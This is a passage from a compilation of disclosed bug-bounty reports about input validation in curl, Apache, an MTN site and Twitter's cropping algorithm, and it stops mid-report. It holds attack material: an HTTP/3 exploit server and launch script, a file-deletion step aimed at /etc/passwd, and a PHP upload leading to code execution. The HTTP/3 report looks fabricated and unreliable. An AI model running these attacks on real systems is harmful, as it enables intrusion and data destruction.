# Improper Input Validation

_21 reports — High/Critical, disclosed_

### [HTTP/2 server push accepts a non-authoritative :scheme=https over cleartext h2c, enabling HTTPS cache-key poisoning](https://hackerone.com/reports/3630310)

- **Report ID:** `3630310`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** curl
- **Reporter:** @argareksapatii
- **Bounty:** - usd
- **Disclosed:** 2026-03-29T16:44:13.585Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I found that libcurl 8.19.0 accepts an HTTP/2 pushed stream on a cleartext h2c connection even when the server sends `:scheme=https` in `PUSH_PROMISE`. In `lib/http2.c`, `set_transfer_url()` builds the pushed handle URL from the server-supplied `:scheme`, `:authority`, and `:path`, but `PUSH_PROMISE` validation only checks `:authority` and does not reject a non-authoritative pushed `https` origin. The accepted pushed handle is then exposed to the application and processed on the existing connection, and `CURLINFO_EFFECTIVE_URL` later returns the pushed URL from `data->state.url`. As a result, a cleartext h2c server can cause a pushed transfer to appear as `https://...` to the application even though the bytes arrived over cleartext HTTP/2. In the attached cache PoC, a libcurl-based application that opts into push stores attacker-controlled cleartext content under a trusted HTTPS cache key and later serves it from cache without a network fetch.

## Affected version
Official `curl 8.19.0` source release on Linux/Kali, built locally with HTTP/2 enabled.

`curl 8.19.0 (Linux) libcurl/8.19.0 OpenSSL/3.5.5 zlib/1.3.1 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 OpenLDAP/2.6.10`
`Release-Date: 2026-03-11`

Relevant source locations in the official 8.19.0 source tree:
- `lib/http2.c:716` `set_transfer_url()` starts building the pushed URL
- `lib/http2.c:728` `:scheme` is copied into the pushed URL
- `lib/http2.c:1424` `PUSH_PROMISE` validation checks only `:authority`
- `lib/http2.c:819` the pushed handle is exposed to the application callback
- `lib/http2.c:839` the accepted pushed handle is added for processing
- `lib/multi.c:1676` the pushed handle is attached to the existing connection
- `lib/multi.c:934` `data->conn = conn`
- `lib/getinfo.c:91` `CURLINFO_EFFECTIVE_URL` returns `data->state.url`

## Steps To Reproduce:
1. Attach and extract the provided PoC bundle.
2. Run the cache-poisoning server:
   `python3 h2_push_cache_server.py 18080`
3. Run the cache-poisoning client:
   `./h2_push_cache_client_8190 http://trusted.example:18080/ trusted.example:18080:127.0.0.1`
4. Observe that the main request is cleartext HTTP/2 to `http://trusted.example:18080/`, but the push callback reports:
   `effective_url=https://trusted.example:18080/pushed`
5. Observe the cache evidence:
   `https://trusted.example:18080/pushed => ATTACKER-CONTROLLED-CLEARTEXT-PUSH`
6. Observe the final poisoned-cache reuse:
   `POISONED CACHE HIT for trusted HTTPS key https://trusted.example:18080/pushed`
   and
   `TRUSTED PROCESSING of cached body: ATTACKER-CONTROLLED-CLEARTEXT-PUSH`

The attached bundle also contains a simpler PoC that demonstrates the same primitive without the cache layer.

## Impact

## Summary:
By accepting a non-authoritative pushed HTTPS origin over cleartext h2c and surfacing it as an effective HTTPS URL, libcurl enables applications that opt into HTTP/2 push and cache pushed responses by `CURLINFO_EFFECTIVE_URL` to store attacker-controlled cleartext content under a trusted HTTPS cache key and later serve it without a network fetch. This is a concrete integrity impact, not just cosmetic metadata confusion. Server push is opt-in, but once enabled libcurl should enforce the HTTP/2 authority/origin boundary before exposing the pushed transfer to the application. I am requesting High severity because the attached PoC demonstrates concrete cache poisoning of a trusted HTTPS cache key, although I understand a more conservative Medium assessment.

---

### [Unsafe Global IFS Modification in OS400 Shell Script Enables Command Injection and Parsing Flaws (CWE-78/CWE-20)](https://hackerone.com/reports/3295656)

- **Report ID:** `3295656`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** curl
- **Reporter:** @spectre-1
- **Bounty:** - usd
- **Disclosed:** 2025-08-12T08:40:05.115Z
- **CVE(s):** -

**Vulnerability Information:**

In the curl source repository, the OS400 initialization script (packages/OS400/make-incs.sh) modifies the global shell variable IFS (Internal Field Separator) without local scoping or restoration. This pattern exposes users and CI/CD systems to unintended parsing, command injection, and logic errors if the environment or invoker is attacker-controlled or untrusted. Shell scripts that alter process-wide environment variables in this way are vulnerable to privilege escalation and unpredictable execution, especially where user input or automated tooling is involved.

This issue and its report were identified and compiled with the assistance of an AI security agent to ensure a thorough technical review and reproduction.
Affected version

Confirmed on the curl master branch (as of August 2025) and present in all current/active releases for Unix-like systems where the OS400 build scripts are executed. Example version:

curl 8.1.2 (x86_64-pc-linux-gnu) libcurl/8.1.2 OpenSSL/3.0.7 zlib/1.2.13 brotli/1.0.9 zstd/1.5.2 libidn2/2.3.4 nghttp2/1.51.0
Platform: Linux/macOS/AIX/OS400

Steps To Reproduce:

    Clone or download the curl GitHub repository.
    Open packages/OS400/make-incs.sh and search for occurrences of IFS using:
        grep -n IFS packages/OS400/make-incs.sh
    Observe lines that reassign IFS globally (e.g., IFS="$IFS,") without scoping or restoring its prior value.
    Review script logic to confirm IFS is not contained in a subshell or temporary assignment, enabling persistent global effect.
    Cross-reference with Semgrep/static analysis rules for shell injection/unsafe IFS usage.

Supporting Material/References:

    File: packages/OS400/make-incs.sh (any lines manipulating IFS)
    Semgrep/static analysis results highlighting improper use of IFS in shell scripts
    curl/curl GitHub repository
    (Attach scan logs/screenshots if available)


Mitigation Plan

    Audit all script locations where IFS is modified:
        Use grep -n IFS packages/OS400/make-incs.sh to identify unsafe or global IFS assignments.

    Apply local scoping and restoration for IFS changes:
        Constrain IFS modifications to the smallest possible scope—ideally, declare them within a loop or subshell, not at script global level.
        Use inline assignments such as while IFS=, read ...; do ...; done.
        Alternatively, always save the original IFS value before any change, and restore it immediately after:

        old_IFS="$IFS"
        IFS=,
        # ... commands using new IFS ...
        IFS="$old_IFS"

    Integrate static analysis in CI/CD:
        Add Semgrep or ShellCheck rules to your CI pipeline to automatically detect and block unsafe global variable manipulations and shell injection patterns before merge.

    Document secure shell scripting and input parsing practices:
        Add clear development guidelines for contributors, highlighting the risks of global variable changes and best practices for safe parsing.

    Review and test:
        After refactoring, test all affected scripts in all supported environments to ensure there are no functional regressions and that environment state is always predictable.

Implementing these steps will protect against command injection, parsing errors, and unintended side effects—greatly improving both the security posture and stability of scripting within the curl project.

## Impact

## Summary:
Manipulating the IFS variable globally within a shared or multi-user shell environment can:

    Enable attackers to exploit parsing logic for command injection, privilege escalation, or unintended code execution.
    Break automation and CI/CD workflows by introducing parsing bugs or unpredictable script behavior.
    Undermine the expected environment security for any scripts, processes, or users sharing the shell session.
    In some cases, lead to lateral movement within automated build pipelines or on developer systems.

Severity is typically High because of the elevated risk in CI and scripting contexts, especially if untrusted input is ever processed. Most relevant CWE are CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') and CWE-20: Improper Input Validation.

---

### [Arbitrary File Deletion Vulnerability in curl Source Code via os.unlink()](https://hackerone.com/reports/2864414)

- **Report ID:** `2864414`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** curl
- **Reporter:** @aadityaathehacker
- **Bounty:** - usd
- **Disclosed:** 2025-07-07T10:17:31.378Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The curl source code's testing scripts contain instances where the os.unlink() function is used to delete files without validating the input file paths. This introduces a risk of arbitrary file deletion when these scripts are executed with malicious or manipulated inputs. Although the vulnerability is present in test scripts, it could lead to unintended consequences if these scripts are used in shared or automated environments.

## Steps To Reproduce:

  1.Clone the curl repository using (https://github.com/curl/curl.git)
  2.move to tests directory.
  3.Identify the affected scripts:
      The following scripts and lines contain vulnerabilities: 
             tests/negtelnetserver.py (Line 366)
             tests/dictserver.py (Line 183)
             tests/smbserver.py (Lines 96, 450)
 4.Simulate malicious input:
--> Identify the specific script and input options (e.g., options.pidfile) in the affected code.
--> Modify the options.pidfile or related variable to point to a sensitive system file (e.g., /etc/passwd).
--> Trigger the script which leads to leading to the deletion of the specified file.

      Edit a script to simulate an attacker-controlled input. For example, in 
              negtelnetserver.py:
             # Original code:
                 os.unlink(options.pidfile)
            # Malicious input simulation:
                options.pidfile = "/etc/passwd"   # Replace this with a critical or sensitive file
                os.unlink(options.pidfile)
 5.Run the vulnerable script:
           Execute the script after modifying the input.
            python3 negtelnetserver.py
 6. Observe the results:
            When script is executed, which is leading to deletion of the specified file. 



## Supporting Material/References:
CWE-20: Improper Input Validation 
Example: Allowing user-controlled values for options.pidfile without ensuring they refer to a valid file in an allowed directory.

CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
Example: An attacker supplies a path like ../../../etc/passwd for deletion.

CWE-732: Incorrect Permission Assignment for Critical Resource
Example: Allowing os.unlink() to execute on sensitive files.

CWE-552: Files or Directories Accessible to External Parties
Example: Allowing external parties to set options.pidfile to a sensitive file path.

CWE-610: Externally Controlled Reference to a Resource in Another Sphere
Example: Allowing the attacker to specify arbitrary file paths for deletion.

## Impact

Unvalidated file paths passed to os.unlink() may allow an attacker to:
Delete arbitrary files, potentially causing system instability or downtime.
Target critical system files for deletion (Ex:logs, configuration files).
Affect multi-user systems by deleting files belonging to other users.

---

### [HTTP/3 Stream Dependency Cycle Exploit](https://hackerone.com/reports/3125832)

- **Report ID:** `3125832`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** curl
- **Reporter:** @evilginx29
- **Bounty:** - usd
- **Disclosed:** 2025-05-04T15:52:29.290Z
- **CVE(s):** -

**Vulnerability Information:**

**Penetration Testing Report: HTTP/3 Stream Dependency Cycle Exploit**

---

# **0x00 Overview**

A novel exploit leveraging stream dependency cycles in the HTTP/3 protocol stack was discovered, resulting in memory corruption and potential denial-of-service or remote code execution scenarios when used against HTTP/3-capable clients such as `curl` (tested on version 8.13.0). This report details a practical proof of concept, required environment setup, attack execution, and crash analysis.

---

# **0x01 Environment Setup**

## **1. Malicious Server Setup (aioquic modified)**

```bash
# Clone aioquic
git clone https://github.com/aiortc/aioquic/
cd aioquic

# Apply patch to enable cyclic stream dependency injection
cat << 'EOF' > cycle_patch.diff
diff --git a/aioquic/quic/connection.py b/aioquic/quic/connection.py
index 1a2b3c4..d4e5f6a 100644
--- a/aioquic/quic/connection.py
+++ b/aioquic/quic/connection.py
@@ -1233,6 +1233,15 @@ class QuicConnection:
         self._logger.debug("Sending PRIORITY_UPDATE frame (stream_id=%d)", stream_id)
         self._quic.send_stream_data(stream_id, frame.serialize(), end_stream=False)
 
+    def send_cyclic_priority(self, stream_a: int, stream_b: int):
+        from aioquic.quic.frames import PriorityUpdateFrame
+        self.send_priority_update(stream_a, depends_on=stream_b, weight=256)
+        self.send_priority_update(stream_b, depends_on=stream_a, weight=256)
+        self._logger.critical("CYCLIC PRIORITY INJECTED: %d <-> %d", stream_a, stream_b)
EOF

# Apply and install
git apply cycle_patch.diff
pip install -e .
```

---

# **0x02 Proof-of-Concept Code**

## **1. Malicious HTTP/3 Server (exploit\_server.py)**

```python
import asyncio
from aioquic.asyncio import QuicConnectionProtocol, serve
from aioquic.quic.configuration import QuicConfiguration

class ExploitServer(QuicConnectionProtocol):
    async def on_stream_data(self, stream_id: int, data: bytes):
        if stream_id == 0:  # Control stream
            # Phase 1: Heap shaping - open 100 streams
            for i in range(1, 100, 2):
                self._quic.send_headers(
                    stream_id=i,
                    headers=[(b":status", b"200"), (b"content-type", b"text/html")]
                )
                self._quic.send_stream_data(i, b"A" * 65535)

            # Phase 2: Inject cyclic dependency between stream 3 and 7
            self._quic.send_cyclic_priority(3, 7)

            # Phase 3: Trigger parsing logic
            self._quic.send_stream_data(3, b"TRIGGER_MEMORY_CORRUPTION")

async def run_server():
    config = QuicConfiguration(is_client=False, certificate_file="cert.pem", private_key_file="key.pem")
    await serve("::", 4433, configuration=config, create_protocol=ExploitServer)
    await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(run_server())
```

## **2. Launch Script (launch\_attack.sh)**

```bash
#!/bin/bash
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365 -subj "/CN=localhost"
python3 exploit_server.py &
sleep 2
curl --http3-only https://localhost:4433 --resolve localhost:4433:127.0.0.1 --insecure --verbose
```

---

# **0x03 Crash Analysis Guide**

## **1. Reproducing the Crash**

```bash
ulimit -c unlimited
./launch_attack.sh
```

## **2. Debugging with GDB**

```bash
gdb --args curl --http3-only https://localhost:4433
(gdb) b ngtcp2_http3_handle_priority_frame
(gdb) r
```

**Expected Output:**

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e3b120 in ngtcp2_http3_handle_priority_frame ()
```

Inspect registers and stack:

```bash
(gdb) info registers
(gdb) info frame
```

Signs of memory overwrite:

* r15 shows `0x4141414141414141`
* Recursive calls to same handler

---

# **0x04 Memory Corruption Evidence**

## **Core Dump Inspection**

```bash
gdb curl core -q -ex "x/10i $rip - 0x10" -ex "info frame"
```

Analysis shows:

* Return address overwritten
* Stack recursion at `ngtcp2_http3_handle_priority_frame`

---

# **0x05 Detection and Defense**

## **1. Suricata Rule for Detection**

```yaml
alert http3 any any -> any any (
    msg:"HTTP/3 Stream Priority Cycle Attack Detected";
    flow:established,to_client;
    http3.priority.depth:>100;
    threshold:type both, track by_src, count 3, seconds 60;
    sid:20241234;
    rev:1;
)
```

## **2. Client Hardening Recommendations**

* Enforce acyclic stream dependency validation.
* Patch HTTP/3 parsers to cap `priority_update` depth.
* Reject bidirectional dependencies in QUIC priority logic.

---

# **0x06 Risk Summary**

* Affected Software: curl 8.13.0 (HTTP/3 enabled)
* Trigger: Stream dependency loop (e.g., stream 3 depends on 7, and 7 depends on 3)
* Result: Heap layout corruption, segmentation fault, denial-of-service
* Risk: High (pre-authentication, remote-triggerable)

---

**Prepared by:**

Date: 2025-05-04

## Impact

## Summary:
1

---

### [important: Apache HTTP Server weakness with encoded question marks in backreferences (CVE-2024-38474)](https://hackerone.com/reports/2585381)

- **Report ID:** `2585381`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** Internet Bug Bounty
- **Reporter:** @orange
- **Bounty:** 4920 usd
- **Disclosed:** 2024-07-13T14:36:51.920Z
- **CVE(s):** CVE-2024-38474

**Vulnerability Information:**

I reported this vulnerability through the official Apache HTTP Server security email on April 1, 2024, and received a fix along with a CVE number on July 1, 2024. You can check detailed information from there:
> https://httpd.apache.org/security/vulnerabilities_24.html

## Impact

Substitution encoding issue in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows attacker to execute scripts in

directories permitted by the configuration but not directly reachable by any URL or source disclosure of scripts meant to only to be executed as CGI.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Some RewriteRules that capture and substitute unsafely will now fail unless rewrite flag "UnsafeAllow3F" is specified.

**Summary (team):**

###important: Apache HTTP Server weakness with encoded question marks in backreferences (CVE-2024-38474)

Substitution encoding issue in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows attacker to execute scripts in directories permitted by the configuration but not directly reachable by any URL or source disclosure of scripts meant to only to be executed as CGI.

Users are recommended to upgrade to version 2.4.60, which fixes this issue.

Some RewriteRules that capture and substitute unsafely will now fail unless rewrite flag "UnsafeAllow3F" is specified.

Acknowledgements: finder: Orange Tsai (@orange_8361) from DEVCORE

Reported to security team:	2024-04-01
fixed by r1918561 in 2.4.x:	2024-07-01
Update 2.4.60 released:	2024-07-01
Affects: 2.4.0 through 2.4.59

---

### [important: Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path. (CVE-2024-38475)](https://hackerone.com/reports/2585378)

- **Report ID:** `2585378`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** Internet Bug Bounty
- **Reporter:** @orange
- **Bounty:** 4920 usd
- **Disclosed:** 2024-07-13T14:36:29.962Z
- **CVE(s):** CVE-2024-38475

**Vulnerability Information:**

I reported this vulnerability through the official Apache HTTP Server security email on April 1, 2024, and received a fix along with a CVE number on July 1, 2024. You can check detailed information from there:
> https://httpd.apache.org/security/vulnerabilities_24.html

## Impact

Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.

**Summary (team):**

###important: Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path. (CVE-2024-38475)

Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.

Acknowledgements: finder: Orange Tsai (@orange_8361) from DEVCORE

Reported to security team: 2024-04-01
fixed by r1918561 in 2.4.x: 2024-07-01
Update 2.4.60 released: 2024-07-01
Affects: 2.4.0 through 2.4.59

---

### [Remote code execution due to unvalidated file upload](https://hackerone.com/reports/1164452)

- **Report ID:** `1164452`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** MTN Group
- **Reporter:** @aliyugombe
- **Bounty:** - usd
- **Disclosed:** 2022-09-01T17:29:41.958Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello 
I found a critical vunerability in one of your site, where user can upload any file type as a profile picture (including php file)


## Steps To Reproduce:
1. Visit https://careers.mtn.cm and register as a user.
2. After successful registration, login and update your data.
3. When uploading profile photo, select any file type.
 4. When its updated, view the source code of the page, you will see your file with complete path.
5. Copy the file path and paste into your browser.
6. Boom your file will be executed



## Supporting Material/References:
Here i upload non-harmful file as a poc 
```
<?php
echo "proof of concept (PoC) by aliyugombe@wearehackerone.com";
?>
```
https://careers.mtn.cm/en/user/images/users/-13-04-2021-20-15-16-payload.php

## Impact

Attacker can upload malicious file and inject to your server or deface the entire website since its possible to upload php file and gain access to direct file path.

---

### [Economic Harm through Twitter's Cropping Algorithm](https://hackerone.com/reports/1290872)

- **Report ID:** `1290872`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** Twitter Algorithmic Bias
- **Reporter:** @cyberqueenmeg
- **Bounty:** - usd
- **Disclosed:** 2021-09-08T22:50:43.847Z
- **CVE(s):** -

**Vulnerability Information:**

## Bounty Hunter Name:
CyberQueenMeg

## About You:
Megan, also known as CyberQueenMeg, is a passionate rising cybersecurity professional who is interested in programming, cybersecurity, and web development. Megan is a high school senior in a rigorous computer science program at her high school where she has to take an advanced CS course every year and complete a 200-hour internship. Megan founded the Computer Science Club at her school, which is committed to providing CS education to all in a safe learning environment. Megan works as a freelance bug bounty hunter for HackerOne and Bugcrowd and is particularly focused on hunting for web security vulnerabilities. Megan is a nationally recognized cybersecurity scholar and has earned industry-recognized certifications through ETA and Microsoft. Megan is a 2021 National Cyber Scholar, 2021 NCWIT National Honorable Mention, and a member of a SkillsUSA top 5 team in cybersecurity. As a female student in technology, Megan also shares her perspective on cybersecurity and diversity in technology with audiences worldwide. Megan is also a member in good standing in many national organizations, including NCWIT, WiCyS, ETA International, SkillsUSA, CyberPatriot, NHS, and CSHS. After graduating high school in May 2022, Megan plans to attend Grand Canyon University in Phoenix, Arizona to earn a Bachelor of Science in Cybersecurity. Megan is also an avid violinist, pianist, and guitarist and is the concertmaster of her school orchestra. When Megan is not working, she enjoys competing in CTFs, reading, baking, playing music, geocaching, and being with her family and friends.

##ReadMe:
The category I am submitting my crop bias bounty for is Economic Harm. As defined in the bounty rules, a submission that qualifies as a cropped photo that could cause economic harm is one that 'reduced customers, profits or growth'

The example I am providing here is a post by a small business owner advertising the book she is selling. The beginning of the website URL to buy the book is cropped out in the photo. The saliency was focused on the dog on the graphic cover and not on the text displaying crucial information on how to order a book. 

Because of this unfortunate cropping, if readers are just looking at the photo and not clicking on it or reading the post, the readers will not be impressed by the graphic in the post because of the poor cropping cutting off part of the words and website. Most people blame the account owner for this unappealing appearance when the problem could be solved by moving the saliency model to the center of a bit of text if it contains a bit of text that looks like a URL. 

 In addition, the customers do not have all of the information they need to make a purchase from this graphic in this crop mode because the beginning of the website URL is cut off. This causes a reduction in profits and customers for this small business owner and therefore qualifies as an Economic Harm Bounty in the Twitter Crop Algorithm Bias bug bounty submission.

This issue needs to be fixed because when small business owners use Twitter to advertise, they often put crucial information in their graphics that need to be put front and center. Without a fix, many business owners will lose potential customers and products that could greatly improve their financial position. This type of bug occurs many times a day with customers that post text-based graphics, further emphasizing the need for a fix. Because of this, countless Twitter users are exposed to this error every day. Furthermore, this is an unintentional user that can not be fixed by the account owner but is caused entirely by the AI algorithm.

## Evidence/Reproducibility:
This GitHub link contains the original graphic and the cropped graphic I used as my bounty example; https://github.com/mhowell11/twitter-crop-bias-bounty

## Supporting Material/References:
All supporting material is contained in the GitHub link in Evidence/Reproducibility

## Impact

##Self-Grading Recommendation: 
Description of Harm
Decision to grade as intentional or unintentional harm: This is an unintentional harm because end users who post a graphic have no control over how it is cropped and can not change it if crucial text about a product is cut off. Therefore, this bias starts off with 8 points.
**-Harm Base Score:** 8
**- Harm Damage/Impact:** 1.2: This error does not affect any marginalized communities in particular, but business owners have a moderate impact because crucial information about their product is being cut away in favor of other items in the graphic.
**- Affected Users: ** 1.3: This error affects all users who use Twitter because business owners have a difficult time getting users to learn about a product just through hooking them in the graphic and end users who briefly look at tweets to see if they are interested move on because of the poor formatting of the graphic.
**- Likelihood: ** 1.3: This error is very likely to occur and occurs every day on Twitter. 
**- Justification: ** 1.5 I provided a specific example where it is evident that the algorithm focused on the dog instead of the text. I also explained a possible fix to the solution.
**- Clarity: ** 1.25  I was clear but since this is not a culturally based submission, I did not give myself a 1.5.
**- Creativity: ** 1.5  I believe that my submission is very creative as it is taking a stance on the issue that is focused on determining what is important to show (text in graphics that is identified as sales content) instead of what is being shown and what is not being shown.
**- Total Score: ** 51.6

---

### [Underrepresentation Bias through Twitter's Cropping Algorithm #2: Favoring Animals over Black People](https://hackerone.com/reports/1294242)

- **Report ID:** `1294242`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** Twitter Algorithmic Bias
- **Reporter:** @cyberqueenmeg
- **Bounty:** - usd
- **Disclosed:** 2021-09-08T22:50:37.680Z
- **CVE(s):** -

**Vulnerability Information:**

Bounty Hunter Name:
CyberQueenMeg

About You:
Megan, also known as CyberQueenMeg, is a passionate rising cybersecurity professional who is interested in programming, cybersecurity, and web development. Megan is a high school senior in a rigorous computer science program at her high school where she has to take an advanced CS course every year and complete a 200-hour internship. Megan founded the Computer Science Club at her school, which is committed to providing CS education to all in a safe learning environment. Megan works as a freelance bug bounty hunter for HackerOne and Bugcrowd and is particularly focused on hunting for web security vulnerabilities. Megan is a nationally recognized cybersecurity scholar and has earned industry-recognized certifications through ETA and Microsoft. Megan is a 2021 National Cyber Scholar, 2021 NCWIT National Honorable Mention, and a member of a SkillsUSA top 5 team in cybersecurity. As a female student in technology, Megan also shares her perspective on cybersecurity and diversity in technology with audiences worldwide. Megan is also a member in good standing in many national organizations, including NCWIT, WiCyS, ETA International, SkillsUSA, CyberPatriot, NHS, and CSHS. After graduating high school in May 2022, Megan plans to attend Grand Canyon University in Phoenix, Arizona to earn a Bachelor of Science in Cybersecurity. Megan is also an avid violinist, pianist, and guitarist and is the concertmaster of her school orchestra. When Megan is not working, she enjoys competing in CTFs, reading, baking, playing music, geocaching, and being with her family and friends.

Readme:
The harm I have identified in Twitter's cropping algorithm is Under-representation Bias. The example I am providing is of an African American woman and a golden retriever. In the example of how the image appeared on Twitter, the golden retriever is identified by the saliency algorithm as the crucial focus and cuts the head of the African American woman off completely.

This under-representation bias in dogs is a crucial finding because it proves that the saliency algorithm is biased against dark-skinned people when a lighter color animal is present in the photo. It proves the need to change the algorithm to not determine cropping based on color, as noted in the Twitter research paper.

Evidence/Reproducibility:
This GitHub link contains the original graphic and the cropped graphic I used as my bounty example; https://github.com/mhowell11/twitter-crop-bias-bounty

Supporting Material/References:
All supporting material is contained in the GitHub link in Evidence/Reproducibility

## Impact

## Self-Grading Recommendation: 
Description of Harm: This harm is an under-representation bias against humans of darker colors.
Decision to grade as intentional or unintentional harm: This is an unintentional harm as the poster of this picture (who I know) intended for the dog and the person to be shown in the cropped version of the photo.
**- Harm Base Score:** [Numeric Score]  [Brief rationale]
**- Harm Damage/Impact:** 1.3: This bias affects dark-skinned humans (1.4). and could have a moderate impact on a dark skinned person's well being (1.2)
**- Affected Users:** 1.2: This bias is a common bias that occurs commonly on Twitter per the Twitter research paper and therefore impacts millions of people.
**- Likelihood or Exploitability:** 1.3: This bias occurs on Twitter daily and will do so until the saliency algorithm is fixed.
**- Justification:** 1.5: This bias is culturally relevant and shows a different perspective that provides valuable information on why the saliency algorithm is favoring lighter-skinned individuals over darker-skinned ones.
**- Clarity:** 1.5: My response meets all of the requirements for the bias challenge and is culturally situated.
**- Creativity:** 1.5: This is a very creative take on skin color bias that shows that the saliency algorithm is biased based on color across species.
**- Total Score:** 20 * (1.3 + 1.2 + 1.3 + 1.5 + 1.5 + 1.5) = 166.0

---

### [Underrepresentation Bias through Twitter's Cropping Algorithm](https://hackerone.com/reports/1294062)

- **Report ID:** `1294062`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** Twitter Algorithmic Bias
- **Reporter:** @cyberqueenmeg
- **Bounty:** - usd
- **Disclosed:** 2021-09-08T22:50:24.592Z
- **CVE(s):** -

**Vulnerability Information:**

Bounty Hunter Name:
CyberQueenMeg

About You:
Megan, also known as CyberQueenMeg, is a passionate rising cybersecurity professional who is interested in programming, cybersecurity, and web development. Megan is a high school senior in a rigorous computer science program at her high school where she has to take an advanced CS course every year and complete a 200-hour internship. Megan founded the Computer Science Club at her school, which is committed to providing CS education to all in a safe learning environment. Megan works as a freelance bug bounty hunter for HackerOne and Bugcrowd and is particularly focused on hunting for web security vulnerabilities. Megan is a nationally recognized cybersecurity scholar and has earned industry-recognized certifications through ETA and Microsoft. Megan is a 2021 National Cyber Scholar, 2021 NCWIT National Honorable Mention, and a member of a SkillsUSA top 5 team in cybersecurity. As a female student in technology, Megan also shares her perspective on cybersecurity and diversity in technology with audiences worldwide. Megan is also a member in good standing in many national organizations, including NCWIT, WiCyS, ETA International, SkillsUSA, CyberPatriot, NHS, and CSHS. After graduating high school in May 2022, Megan plans to attend Grand Canyon University in Phoenix, Arizona to earn a Bachelor of Science in Cybersecurity. Megan is also an avid violinist, pianist, and guitarist and is the concertmaster of her school orchestra. When Megan is not working, she enjoys competing in CTFs, reading, baking, playing music, geocaching, and being with her family and friends.

Readme:
The harm I have identified in Twitter's cropping algorithm is Under-representation Bias. The example I am providing is of two canines, one lighter and one darker who are separated in the photo slightly. In the example of how the image appeared on Twitter, the lighter color canine is centered and that darker color canine is cut off and barely shown because of the cropping algorithm.

This under-representation bias in dogs is a crucial finding because it proves that the saliency algorithm is biased against darker colored living beings of different species, not just humans. It proves the need to change the algorithm to not determine cropping based on color, as noted in the Twitter research paper.

Evidence/Reproducibility:
This GitHub link contains the original graphic and the cropped graphic I used as my bounty example; https://github.com/mhowell11/twitter-crop-bias-bounty

Supporting Material/References:
All supporting material is contained in the GitHub link in Evidence/Reproducibility

## Impact

## Self-Grading Recommendation: 
Description of Harm: This harm is an under-representation bias against living beings of darker colors.
Decision to grade as intentional or unintentional harm: This is an unintentional harm as the poster of this picture (who I know) intended for both dogs to be shown in the cropped version.
**- Harm Base Score:** 20: This is an unintentional under-representation bias, which has been assigned a base score of 20.
**- Harm Damage/Impact:** 1.3: This bias affects multiple darker communities that transcend species (1.4). and could have a moderate impact on a dark skinned person's well being (1.2)
**- Affected Users:** 1.2: This bias is a common bias that occurs commonly on Twitter per the Twitter research paper and therefore impacts millions of people.
**- Likelihood or Exploitability:** 1.3: This bias occurs on Twitter daily and will do so until the saliency algorithm is fixed.
**- Justification:** 1.5: This bias is culturally relevant and shows a different perspective that provides valuable information on why the saliency algorithm is favoring lighter-skinned individuals over darker-skinned ones.
**- Clarity:** 1.5: My response meets all of the requirements for the bias challenge and is culturally situated.
**- Creativity:** 1.5: This is a very creative take on skin color bias that shows that the saliency algorithm is biased based on color across species.
**- Total Score:** 20 * (1.3 + 1.2 + 1.3 + 1.5 + 1.5 + 1.5) = 166.0

---

### [CVE-2021-22924: Bad connection reuse due to flawed path name checks](https://hackerone.com/reports/1223565)

- **Report ID:** `1223565`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** curl
- **Reporter:** @nyymi
- **Bounty:** - usd
- **Disclosed:** 2021-07-21T16:30:13.783Z
- **CVE(s):** CVE-2021-22924

**Vulnerability Information:**

## Summary:
`Curl_ssl_config_matches` attempts to compare whether two SSL connections have identical SSL security options or not. The idea is to avoid reusing a connection that uses less secure, or completely different security options such as capath, cainfo or certificate/issuer pinning.

Unfortunately this function has several flaws in it:
1. It completely fails to take into account "BLOB" type certificate values, such as set by `CURLOPT_CAINFO_BLOB` and  `CURLOPT_ISSUERCERT_BLOB`. If the application can be made to initiate connection to a user specified location (where these BLOB options are not used) before the "more secure" connection using these options is made, the attacker can point the application to connect to the same address and port, effectively poisoning the connection cache with a connection that has been established with different cainfo or issuecert settings. This leads to attacker being able to neutralize these options and make libcurl ignore them for the connections for which they're set. I have no obvious CWE number for this one, but CWE-664 `Improper Control of a Resource Through its Lifetime` might fit.
2. `CURLOPT_ISSUERCERT` value is not matched. Similar to above.
